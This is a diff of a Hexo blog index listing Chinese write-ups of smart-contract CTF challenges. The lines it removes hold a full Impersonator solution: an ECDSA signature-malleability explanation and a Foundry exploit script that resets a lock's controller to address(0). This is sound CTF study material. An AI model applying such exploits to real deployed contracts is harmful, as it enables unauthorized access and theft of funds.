+            <a href="/2026/03/24/FREEBIE/" class="post-title-link" itemprop="url">FREEBIE</a>
+        </h2>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2026-03-24 10:49:52" itemprop="dateCreated datePublished" datetime="2026-03-24T10:49:52+08:00">2026-03-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-03-27 11:43:44" itemprop="dateModified" datetime="2026-03-27T11:43:44+08:00">2026-03-27</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.1k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="FREEBIE"><a href="#FREEBIE" class="headerlink" title="FREEBIE"></a>FREEBIE</h1><p>from onlypwner</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2026/03/24/FREEBIE/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2026/03/24/Impersonator/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -347,7 +366,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="MyBlog">
+      <meta itemprop="name" content="AUV wordmaya">
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
@@ -356,30 +375,37 @@
         </h2>
 
         <div class="post-meta">
+          
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-calendar"></i>
               </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
+              <span class="post-meta-item-text">发表于</span>
 
-              <time title="Created: 2026-03-24 10:49:52 / Modified: 11:49:23" itemprop="dateCreated datePublished" datetime="2026-03-24T10:49:52+08:00">2026-03-24</time>
+              <time title="创建时间：2026-03-24 10:49:52" itemprop="dateCreated datePublished" datetime="2026-03-24T10:49:52+08:00">2026-03-24</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-03-27 11:48:34" itemprop="dateModified" datetime="2026-03-27T11:48:34+08:00">2026-03-27</time>
+              </span>
 
           <br>
-            <span class="post-meta-item" title="Symbols count in article">
+            <span class="post-meta-item" title="本文字数">
               <span class="post-meta-item-icon">
                 <i class="far fa-file-word"></i>
               </span>
-                <span class="post-meta-item-text">Symbols count in article: </span>
+                <span class="post-meta-item-text">本文字数：</span>
               <span>5.2k</span>
             </span>
-            <span class="post-meta-item" title="Reading time">
+            <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
-                <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>5 mins.</span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
             </span>
 
         </div>
@@ -391,36 +417,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="Impersonator"><a href="#Impersonator" class="headerlink" title="Impersonator"></a>Impersonator</h1><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>证明任何人都可以打开门</p>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul>
-<li><p>源代码中有两个合约，合约Impersonator中的函数只有owner可以调用；ECLocker中有两个可以调用的函数</p>
-<ul>
-<li><code>changeController()</code>,当我们输入的<code>r, v, s</code>可以复原出初始<code>controller</code>的地址，<code>controller</code>就会被设为我们的输入的地址</li>
-<li><code>open()</code>:当我们输入的<code>r, v, s</code>可以复原出<code>controller</code>的地址，那么门就会打开</li>
-</ul>
-</li>
-<li><p>函数<code>_isValidSignature</code>中要求我们输入的<code>r, v, s</code>,不能还原出用过的签名，根据椭圆曲线算法的对称性，</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r1   v1   s1</span><br><span class="line">r2 = r1</span><br><span class="line">v1 = 28(查到的是27)</span><br><span class="line">s2 = n -s1</span><br></pre></td></tr></table></figure>
-
-<p>其中secp256k1 的 n 固定为<code>FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141</code></p>
-</li>
-<li><p>但是通过复原成功签名再打开门满足不了任何人都可以打开门的要求，但是如果我们输入的r v s 错误，还原的地址为0。我们可以先调用<code>changeController()</code>，将新的<code>controller</code>设为<code>address(0)</code>。这样，当调用<code>open()</code>时，我们可以输入任意数字，地址都会被还原为0，从而满足<code>address add = _isValidSignature(v, r, s);</code></p>
-</li>
-<li><p>在区块浏览器查询实例地址</p>
-<p><img src="C:\Users\34420\AppData\Roaming\Typora\typora-user-images\image-20251125175953190.png" alt="image-20251125175953190"></p>
-<p><img src="C:\Users\34420\AppData\Roaming\Typora\typora-user-images\image-20251125180117467.png" alt="image-20251125180117467"></p>
-<p>红色是真正的owner，黄色部分是找到的<code>r, v, s</code></p>
-</li>
-<li><p>最后，实例地址是合约<code>Impersonator</code>的地址，合约<code>ECLocker</code>的地址可以通过调用<code>ECLocker()</code>找到</p>
-</li>
-</ul>
-<h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p>contract.sol</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">//目标：任何人都可以打开门</span><br><span class="line">//0x4dBF353A22A5D7f28516deaF6A4aF8BAD81802c1</span><br><span class="line">pragma solidity ^0.8.28;</span><br><span class="line"></span><br><span class="line">import &quot;lib/openzeppelin-contracts/contracts/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">// SlockDotIt ECLocker factory</span><br><span class="line">contract Impersonator is Ownable &#123;</span><br><span class="line">    uint256 public lockCounter;</span><br><span class="line">    ECLocker[] public lockers;</span><br><span class="line"></span><br><span class="line">    event NewLock(address indexed lockAddress, uint256 lockId, uint256 timestamp, bytes signature);</span><br><span class="line"></span><br><span class="line">    constructor(uint256 _lockCounter) Ownable(msg.sender)&#123;</span><br><span class="line">        lockCounter = _lockCounter;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deployNewLock(bytes memory signature) public onlyOwner &#123;</span><br><span class="line">        // Deploy a new lock</span><br><span class="line">        ECLocker newLock = new ECLocker(++lockCounter, signature);</span><br><span class="line">        lockers.push(newLock);</span><br><span class="line">        emit NewLock(address(newLock), lockCounter, block.timestamp, signature);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ECLocker &#123;</span><br><span class="line">    uint256 public immutable lockId;</span><br><span class="line">    bytes32 public immutable msgHash;</span><br><span class="line">    address public controller;</span><br><span class="line">    mapping(bytes32 =&gt; bool) public usedSignatures;</span><br><span class="line"></span><br><span class="line">    event LockInitializated(address indexed initialController, uint256 timestamp);</span><br><span class="line">    event Open(address indexed opener, uint256 timestamp);</span><br><span class="line">    event ControllerChanged(address indexed newController, uint256 timestamp);</span><br><span class="line"></span><br><span class="line">    error InvalidController();</span><br><span class="line">    error SignatureAlreadyUsed();</span><br><span class="line"></span><br><span class="line">    /// @notice Initializes the contract the lock</span><br><span class="line">    /// @param _lockId uinique lock id set by SlockDotIt&#x27;s factory</span><br><span class="line">    /// @param _signature the signature of the initial controller</span><br><span class="line">    constructor(uint256 _lockId, bytes memory _signature) &#123;</span><br><span class="line">        // Set lockId</span><br><span class="line">        lockId = _lockId;</span><br><span class="line"></span><br><span class="line">        // Compute msgHash</span><br><span class="line">        bytes32 _msgHash;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            mstore(0x00, &quot;\x19Ethereum Signed Message:\n32&quot;) // 28 bytes</span><br><span class="line">            mstore(0x1C, _lockId) // 32 bytes</span><br><span class="line">            _msgHash := keccak256(0x00, 0x3c) //28 + 32 = 60 bytes</span><br><span class="line">        &#125;</span><br><span class="line">        msgHash = _msgHash;</span><br><span class="line"></span><br><span class="line">        // Recover the initial controller from the signature</span><br><span class="line">        address initialController = address(1);</span><br><span class="line">        assembly &#123;</span><br><span class="line">            let ptr := mload(0x40)</span><br><span class="line">            mstore(ptr, _msgHash) // 32 bytes</span><br><span class="line">            mstore(add(ptr, 32), mload(add(_signature, 0x60))) // 32 byte v</span><br><span class="line">            mstore(add(ptr, 64), mload(add(_signature, 0x20))) // 32 bytes r</span><br><span class="line">            mstore(add(ptr, 96), mload(add(_signature, 0x40))) // 32 bytes s</span><br><span class="line">            pop(</span><br><span class="line">                staticcall(</span><br><span class="line">                    gas(), // Amount of gas left for the transaction.</span><br><span class="line">                    initialController, // Address of `ecrecover`.</span><br><span class="line">                    ptr, // Start of input.</span><br><span class="line">                    0x80, // Size of input.</span><br><span class="line">                    0x00, // Start of output.</span><br><span class="line">                    0x20 // Size of output.</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">            if iszero(returndatasize()) &#123;</span><br><span class="line">                mstore(0x00, 0x8baa579f) // `InvalidSignature()`.</span><br><span class="line">                revert(0x1c, 0x04)</span><br><span class="line">            &#125;</span><br><span class="line">            initialController := mload(0x00)</span><br><span class="line">            mstore(0x40, add(ptr, 128))</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Invalidate signature</span><br><span class="line">        usedSignatures[keccak256(_signature)] = true;</span><br><span class="line"></span><br><span class="line">        // Set the controller</span><br><span class="line">        controller = initialController;</span><br><span class="line"></span><br><span class="line">        // emit LockInitializated</span><br><span class="line">        emit LockInitializated(initialController, block.timestamp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// @notice Opens the lock</span><br><span class="line">    /// @dev Emits Open event</span><br><span class="line">    /// @param v the recovery id</span><br><span class="line">    /// @param r the r value of the signature</span><br><span class="line">    /// @param s the s value of the signature</span><br><span class="line">    function open(uint8 v, bytes32 r, bytes32 s) external &#123;</span><br><span class="line">        address add = _isValidSignature(v, r, s);</span><br><span class="line">        emit Open(add, block.timestamp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// @notice Changes the controller of the lock</span><br><span class="line">    /// @dev Updates the controller storage variable</span><br><span class="line">    /// @dev Emits ControllerChanged event</span><br><span class="line">    /// @param v the recovery id</span><br><span class="line">    /// @param r the r value of the signature</span><br><span class="line">    /// @param s the s value of the signature</span><br><span class="line">    /// @param newController the new controller address</span><br><span class="line">    function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external &#123;</span><br><span class="line">        _isValidSignature(v, r, s);</span><br><span class="line">        controller = newController;</span><br><span class="line">        emit ControllerChanged(newController, block.timestamp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _isValidSignature(uint8 v, bytes32 r, bytes32 s) internal returns (address) &#123;</span><br><span class="line">        address _address = ecrecover(msgHash, v, r, s);</span><br><span class="line">        require (_address == controller, InvalidController());</span><br><span class="line"></span><br><span class="line">        bytes32 signatureHash = keccak256(abi.encode([uint256(r), uint256(s), uint256(v)]));</span><br><span class="line">        require (!usedSignatures[signatureHash], SignatureAlreadyUsed());</span><br><span class="line"></span><br><span class="line">        usedSignatures[signatureHash] = true;</span><br><span class="line"></span><br><span class="line">        return _address;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>Hack.s.sol</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.28;</span><br><span class="line"></span><br><span class="line">import &#123;Script&#125; from &quot;forge-std/Script.sol&quot;;</span><br><span class="line">import &#123;ECLocker , Impersonator&#125; from &quot;../src/contract.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Hack is Script &#123;</span><br><span class="line"></span><br><span class="line">    uint256 n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141;</span><br><span class="line">    uint8 v2 = 28; </span><br><span class="line">    bytes32 r2 = 0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91;</span><br><span class="line">    uint256 s2 = n - 0x78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2;</span><br><span class="line">    function run() external &#123;</span><br><span class="line">        vm.startBroadcast();</span><br><span class="line">        Impersonator im = Impersonator(0x4dBF353A22A5D7f28516deaF6A4aF8BAD81802c1);</span><br><span class="line">        ECLocker ecl = im.lockers(0);</span><br><span class="line">        ecl.changeController(uint8(v2),bytes32(r2),bytes32(s2), address(0));</span><br><span class="line">        ecl.open(0, 0, 0);</span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
+          <h1 id="Impersonator"><a href="#Impersonator" class="headerlink" title="Impersonator"></a>Impersonator</h1><p>from Ethernaut</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2026/03/24/Impersonator/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -439,8 +444,8 @@
       
   
   
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2026/03/24/hello-world/">
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/03/24/MagicAnimalCarousel/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -449,38 +454,46 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="MyBlog">
+      <meta itemprop="name" content="AUV wordmaya">
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2026/03/24/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
+            <a href="/2026/03/24/MagicAnimalCarousel/" class="post-title-link" itemprop="url">MagicAnimalCarousel</a>
         </h2>
 
         <div class="post-meta">
+          
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-calendar"></i>
               </span>
-              <span class="post-meta-item-text">Posted on</span>
+              <span class="post-meta-item-text">发表于</span>
 
-              <time title="Created: 2026-03-24 10:47:18" itemprop="dateCreated datePublished" datetime="2026-03-24T10:47:18+08:00">2026-03-24</time>
+              <time title="创建时间：2026-03-24 10:49:52" itemprop="dateCreated datePublished" datetime="2026-03-24T10:49:52+08:00">2026-03-24</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-03-27 11:49:45" itemprop="dateModified" datetime="2026-03-27T11:49:45+08:00">2026-03-27</time>
+              </span>
 
           <br>
-            <span class="post-meta-item" title="Symbols count in article">
+            <span class="post-meta-item" title="本文字数">
               <span class="post-meta-item-icon">
                 <i class="far fa-file-word"></i>
               </span>
-                <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>367</span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3.1k</span>
             </span>
-            <span class="post-meta-item" title="Reading time">
+            <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
-                <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>1 mins.</span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
             </span>
 
         </div>
@@ -492,20 +505,543 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+          <h1 id="MagicAnimalCarousel"><a href="#MagicAnimalCarousel" class="headerlink" title="MagicAnimalCarousel"></a>MagicAnimalCarousel</h1><p>from Ethernaut</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2026/03/24/MagicAnimalCarousel/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+    
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/03/24/Naught%20Coin/">
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="wordmaya">
+      <meta itemprop="description" content="">
+    </span>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="AUV wordmaya">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2026/03/24/Naught%20Coin/" class="post-title-link" itemprop="url">Naught_Coin</a>
+        </h2>
 
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2026-03-24 10:49:52" itemprop="dateCreated datePublished" datetime="2026-03-24T10:49:52+08:00">2026-03-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-03-27 11:47:04" itemprop="dateModified" datetime="2026-03-27T11:47:04+08:00">2026-03-27</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3.1k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Naught-Coin"><a href="#Naught-Coin" class="headerlink" title="Naught Coin"></a>Naught Coin</h1><p>from Ethernaut</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2026/03/24/Naught%20Coin/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/03/24/Preservation/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="wordmaya">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="AUV wordmaya">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2026/03/24/Preservation/" class="post-title-link" itemprop="url">Preservation</a>
+        </h2>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2026-03-24 10:49:52" itemprop="dateCreated datePublished" datetime="2026-03-24T10:49:52+08:00">2026-03-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-03-27 11:46:59" itemprop="dateModified" datetime="2026-03-27T11:46:59+08:00">2026-03-27</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3.1k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h1><p>from Ethernaut</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2026/03/24/Preservation/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/03/24/REVERSE%20RUGPULL/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="wordmaya">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="AUV wordmaya">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2026/03/24/REVERSE%20RUGPULL/" class="post-title-link" itemprop="url">REVERSE RUGPULL</a>
+        </h2>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2026-03-24 10:49:52" itemprop="dateCreated datePublished" datetime="2026-03-24T10:49:52+08:00">2026-03-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-03-27 11:43:31" itemprop="dateModified" datetime="2026-03-27T11:43:31+08:00">2026-03-27</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="REVERSE-RUGPULL"><a href="#REVERSE-RUGPULL" class="headerlink" title="REVERSE RUGPULL"></a>REVERSE RUGPULL</h1><p>from onlypwner</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2026/03/24/REVERSE%20RUGPULL/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
